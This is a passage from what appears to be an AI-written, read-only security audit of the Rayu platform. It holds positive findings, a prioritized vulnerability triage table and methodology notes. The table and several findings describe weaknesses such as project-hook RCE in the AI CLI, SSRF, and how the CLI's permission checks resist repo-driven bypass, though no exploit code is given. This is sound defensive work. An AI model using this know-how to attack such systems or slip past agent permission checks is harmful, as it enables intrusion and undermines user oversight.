- **PF-28 — Safety checks are bypass-immune.** `permissions.ts` step 1g returns `ask` for `safetyCheck` decisions **even in bypassPermissions mode**, and `filesystem.ts:1319+` runs path-safety *before* allow-rule checks (explicitly so a user cannot grant permission to edit protected files). Writes to `.rayu/settings.json`, `.git/`, `.vscode/`, `.idea/` and shell rc files therefore prompt even in bypass/acceptEdits; `acceptEdits` auto-allows only inside the working directory.
- **PF-29 — Auth token storage is 0600 and never logged.** `rayuSession.ts:108` writes with `mode: 0o600` **and** re-`chmod`s an existing file; the header states tokens are never logged. Refresh POSTs go only to the configured Rayu backend.
- **PF-30 — MCP project trust blocks repo-driven bypass RCE by design.** `getProjectMcpServerStatus` defaults to `'pending'` and deliberately does **not** consult `getSessionBypassPermissionsMode()`, with a comment explaining that project settings could otherwise accept the bypass dialog on the user's behalf.
- **PF-31 — Telegram pairing is strong.** 96-bit random token, constant-time compare, max 5 attempts then token burn, TTL, config at 0600, only the linked `chatId` drives the CLI, remote actions still flow through the permission system as Allow/Always/Deny cards, and terminal-only slash commands are blocked from Telegram.
- **PF-32 — Skill install is traversal-safe and never executes content.** Name sanitization rejects `.`/`..`/`/`; destination and subdir escapes are blocked by `resolve().startsWith()` checks; clone uses argv-form `execFileNoThrow('git', [...])` so a URL cannot inject options; skills dir is `0o700`; only SKILL.md frontmatter is parsed at install time.
- **PF-33 — Analytics cannot structurally carry code, paths or secrets.** A type named `AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS = never` forces an explicit reviewable cast at every event field; bash security events emit only `{checkId, subId}`.
- **PF-34 — WebFetch redirects are not an SSRF pivot.** `isPermittedRedirect` requires identical protocol, port and host (±`www`) and rejects credentials; anything else is handed back to the model as a "REDIRECT DETECTED" message requiring fresh approval. `MAX_REDIRECTS = 10`, 10 MB content cap, 60 s timeout.
- **PF-35 — Deep links are hardened.** ASCII control characters rejected in `q`/`cwd`, hidden Unicode stripped, repo slug pattern enforced, length caps, argv-form exec for most terminals with documented per-shell quoting for the rest, and the query is `--prefill`ed rather than auto-submitted.
- **PF-36 — The CLI login flow binds correctly.** Loopback-only bind (`server.listen(0, '127.0.0.1', …)`), 128-bit state, and state verified on callback — which is what reduces BE-015 to defense-in-depth and closes WEB-008.

### Web
- **PF-37 — Prices are backend-authoritative.** Billing sends only `{planCode, promoCode?}` and reads `amountCents` from the server; the top-up path posts a credit quantity and the server returns the amount. `lib/plans.ts` documents that prices come from the backend and are never hardcoded. **No price tampering.**
- **PF-38 — No XSS sink.** The three `dangerouslySetInnerHTML` uses are static JSON-LD; `react-markdown` is used **without** `rehype-raw`, so embedded HTML in docs/changelog is not rendered; all dynamic strings go through JSX auto-escaping; grep for `innerHTML`/`eval`/`new Function` is clean.
- **PF-39 — Docs routes are traversal-proof.** `dynamicParams = false` plus an explicit slug allow-list before `getDocContent`.
- **PF-40 — No open redirect.** All `callbackUrl` values are same-origin/relative and the CLI callback host is hard-coded to `127.0.0.1`, asserted by a unit test.
- **PF-41 — The Google refresh token stays server-side.** It is set on the NextAuth JWT but never copied into the client-visible session — only the ID token is, which is what WEB-002 addresses.

### Deploy
- **PF-42 — Databases are not publicly exposed.** MySQL is bound to `127.0.0.1:3306` in the single-VPS topology (with an explanatory comment) and publishes **no** port at all in the Coolify topology; Redis publishes no host port in either.
- **PF-43 — Shared-secret topology is correct.** `RAYU_JWT_SECRET` and `RAYU_PROVIDER_SECRET` are fed from the same variable to backend and gateway (they must match), and neither is given to the `web` container, which does not need them. Least privilege is respected at the service boundary.
- **PF-44 — Healthchecks and restart policies on every service**, with `depends_on: condition: service_healthy` gating for both DB-dependent services.

---

## 8. Triage matrix

Exploitability: **Direct** = reachable now with no precondition · **Conditional** = needs a specific (often documented) configuration or context · **Chained** = needs another flaw or a foothold first.
Fix effort: **S** ≲ half a day · **M** ≲ a few days · **L** = design change.

| ID | Finding | Sev | Exploitability | Fix effort | Priority |
|---|---|---|---|---|---|
| BE-001 | ABA alert → free credits/plans, replayable | Critical | Direct (needs group post access) | M | **P0** |
| BE-002 | Hardcoded JWT secret fallback, no boot guard | Critical | Conditional (env unset) | S | **P0** |
| CLI-101 | Project hooks RCE in non-interactive mode | High | Direct (malicious repo + `rayu -p`) | S–M | **P0** |
| BE-004 | Telegram webhook auth fails open | High | Conditional (webhook mode + secret unset) | S | **P0** |
| BE-003 | Google `aud` check skipped when unset | High | Conditional (env unset) + Chained (BE-011) | S | **P1** |
| XC-001 | `.env` files mode 664 with live secrets | Medium | Chained (local read) | S (+ rotation M) | **P1** |
| DEP-001 | Redis unauthenticated on shared network | Medium | Chained (container foothold) | S | **P1** |
| BE-005 / XC-004 | No rate limit on auth/admin-login (app + edge) | Medium | Direct | S | **P1** |
| BE-014 | ABA listener logs payer PII | Medium | Direct (log access) | S | **P1** |
| GW-001 | `/v1/proxy` SSRF: DNS rebinding, no allow-list | Medium | Direct (any valid token) | M | **P2** |
| GW-002 | Unbounded upstream response buffering | Medium | Conditional (hostile/faulty upstream) | S | **P2** |
| CLI-001 | WebFetch SSRF / DNS rebinding | Medium | Conditional (user approves hostname) | S | **P2** |
| WEB-001 | Access + 30-day refresh token in `localStorage` | Medium | Chained (needs XSS/extension) | M–L | **P2** |
| WEB-002 | Google `id_token` exposed to client JS | Medium | Chained | M | **P2** |
| BE-006 | No refresh-token rotation or revocation | Medium | Chained (token theft) | M | **P2** |
| BE-007 | Promo cap TOCTOU oversell | Medium | Direct (needs concurrency) | S | **P2** |
| DEP-002 | No security headers / rate limit at Caddy | Low | Chained | S | **P2** |
| BE-010 | No helmet on the API | Low | Chained | S | **P3** |
| WEB-004 | No security headers in Next config | Low | Chained | S | **P3** |
| DEP-003 / WEB-005 | Backend + web containers run as root | Low | Chained (post-RCE) | S | **P3** |
| BE-011 | OAuth linking without verified email | Low | Chained (BE-003) | S | **P3** |
| GW-004 | JWT `exp` not required; role from claims | Low | Chained (needs secret) | S | **P3** |
| CLI-002 | Project `.mcp.json` auto-approve non-interactive | Low | Conditional (malicious repo + `-p`) | S | **P3** (fix with CLI-101) |
| BE-009 | Git-proxy forwards Rayu JWT upstream | Low | Direct (token → 3rd-party logs) | S | **P3** |
| BE-015 | `redeemCode` ignores bound `state` | Low | Blocked by CLI-side check | S | **P3** |
| WEB-007 / DEP-004 | Secrets in build args / container env | Low | Chained (build artifact access) | M | **P3** |
| CLI-103 | OSC-8 hyperlink target unvalidated | Low | Direct (needs user click) | S | **P3** |
| CLI-102 | SDK MCP tools can shadow built-in names | Low | Conditional (env var + SDK server) | S | **P4** |
| GW-005 | Client-controlled Redis key segment | Low | Direct (self-scoped only) | S | **P4** |
| WEB-003 | Middleware no-op; admin gate client-side | Low | No data impact (backend enforces) | M | **P4** |
| DEP-005 | No container resource limits | Low | Chained | S | **P4** |
| BE-012, BE-013, WEB-008, WEB-009, GW-I01…I04 | Informational | Info | — | S | **P4** |

**Suggested sequencing.** The four P0 items are all small-to-medium and independent; BE-002 and BE-004 in particular are a few lines of boot-time validation each and should ship first because they convert a silent misconfiguration into a loud startup failure. BE-001 needs the most design thought (sender verification plus a `trxId` uniqueness constraint plus a payment-reference binding) and is the only item with direct financial loss. CLI-101 and CLI-002 share one root cause and should be fixed in a single change to the non-interactive trust model.

---

## 9. Methodology & Limitations

### What was reviewed

| Project | Coverage |
|---|---|
| **rayu-backend** | All 81 first-party source files enumerated; every file in `src/auth`, `src/payments`, `src/promo`, `src/telegram`, `src/admin`, `src/users`, `src/settings`, `src/providers`, `src/common`, `src/studio`, plus `main.ts`, `app.module.ts`, `configuration.ts`, `seed.ts`, `schema.prisma`, `Dockerfile`, `docker-entrypoint.sh` and the `scripts/`. Every controller was enumerated and mapped to its guard. Every raw-SQL call site was located and judged. |
| **rayu-gateway** | All non-test files in `internal/` and `cmd/`, `go.mod`, `Dockerfile`. Every route registration in `server.go` was enumerated against its middleware chain. Test files were consulted only as evidence of intent. |
| **rayu-web** | Every `*.ts`/`*.tsx`/`*.mjs`/`Dockerfile` outside `node_modules`/`.next` (74 files), including all app routes, admin pages, `lib/`, `auth.ts`, `middleware.ts`, `next.config.mjs`. |
| **rayu CLI** | Prioritized by attack surface, not exhaustively — see below. Permissions engine, BashTool + classifier + AST, `Shell.ts`, filesystem safety checks, WebFetch, `rayuAuth`, MCP trust/registration/OAuth-adjacent paths, Telegram bridge, skill install, deep links, analytics, media-gen clients, `bridge/sessionRunner.ts`, the Ink render path, and the hooks engine. |
| **deploy** | `Caddyfile`, both compose files, `.env.example`, and permission/tracking status of `.env`. |
| **Cross-cutting** | Secret scan of tracked files plus `git ls-files` verification; `.env` permission survey; version-pin CVE check; logging sweep; rate-limit inventory. |

Verification protocol: **every Critical and High finding, plus GW-001 and CLI-001, was re-read by me directly against the live file** after the initial per-track pass — not accepted from a summary. Four findings (CLI-101, CLI-102, CLI-103, BE-014) and one downgrade-with-evidence (BE-015 / WEB-008) originated in that verification pass rather than the initial sweep.

### Explicitly out of scope
`node_modules/`, `dist/`, `.next/`, `build/`, generated Prisma client, `next-env.d.ts`, lockfiles (except targeted version lookups), vendored SDKs, and `rayu/un-use-code/`. Sibling directories present in the monorepo but outside the plan's four roots were not audited: `bolt.diy/`, `claude-code/`, `rayu-orchestrator/`, `rayucode/`, `rayu-backend-rust/`, `rayu-gateway-rust/`, `skills/`, `docs/`, `documentations/`. **Note the two Rust ports (`rayu-backend-rust/`, `rayu-gateway-rust/`) are outside the plan's scope but are plausibly future production code; if they are, they need their own audit — findings here do not transfer.**

### Limitations — what could not be confirmed without runtime testing

1. **No code was executed.** No request was sent, no test suite run, no container started. Every finding is static analysis plus data-flow tracing. Race conditions (BE-007), DNS-rebinding timing (GW-001, CLI-001) and DoS thresholds (GW-002) are reasoned from code and would need a runtime harness to demonstrate.
2. **The codebase was being modified concurrently by another agent during this audit.** I observed source files with mtimes inside the audit window (08:30–08:40), including `rayu-gateway/internal/server/server.go`, `rayu-backend/src/main.ts`, `prisma/schema.prisma` and roughly forty CLI files. I re-verified all Critical/High line numbers against the live files at the end of the run, but **line numbers elsewhere in this report may have drifted**; cite the quoted excerpt rather than the line number when locating code. New files also appeared mid-audit (`src/studio/*`, two new Prisma migrations), which is why the backend section covers a Studio module absent from the initial inventory.
3. **CLI coverage is prioritized, not exhaustive.** ~2280 first-party files made full coverage infeasible. Deliberately deprioritized after boundary review: the remote/cron/teleport/coordinator/buddy feature set beyond `sessionRunner.ts`, `src/tools/PowerShellTool/` internals, MCP OAuth (`auth.ts`, `oauthPort.ts`) and elicitation validation, and most of the 145+ UI components. **Absence of a finding in these areas is not evidence of their safety.**
4. **Third-party behaviour is assumed correct.** Prisma's parameterization, `golang-jwt`'s verification, NextAuth's cookie handling, `strip-ansi`, `ansi-tokenize` and the Telegram SDKs were treated as trustworthy; only first-party misuse was reported.
5. **Dependency review is version-pin only.** Two specific CVEs were checked against declared versions (XC-003). No SCA tool was run, so transitive vulnerabilities are unassessed.
6. **BE-001's real-world exploitability depends on external configuration** — Telegram group posting permissions — which is invisible to the code. The code-level gaps (no sender check, no replay guard, amount-only match) are confirmed; who can post is not something the audit can determine.
7. **Environment-dependent findings are reported as fail-open defects, not confirmed live vulnerabilities.** BE-002, BE-003 and BE-004 are all gated on an env var being unset. The audited `.env` sets all three, so this deployment is not currently exposed. They are rated on the severity of the failure mode, because nothing in the code prevents or detects the unsafe state.
8. **Secret values were never printed.** All secret material is referenced as `file:key` with values `REDACTED`. Presence of a live-looking value on disk was determined without reproducing it. I did not verify against the providers whether each credential is currently active; rotation is recommended on the assumption that they are.
9. **`ORIGIN_MANIFEST.md` provenance was not used to weight CLI findings.** The plan suggested treating Rayu-original code as higher-risk; in practice findings were traced on their own merits. CLI-101's location is worth noting for triage though — the surrounding trust-gate comments document prior upstream fixes, so this area has a history of exactly this bug class.

### Deliverable note

This audit was read-only, as the plan requires. `git status` was checked before and after each delegated pass; the only files created are this report and the raw per-track evidence under `.rayu/audit/`. No source file was modified by me or by any sub-agent. Concurrent modifications by the other active agent were left untouched.
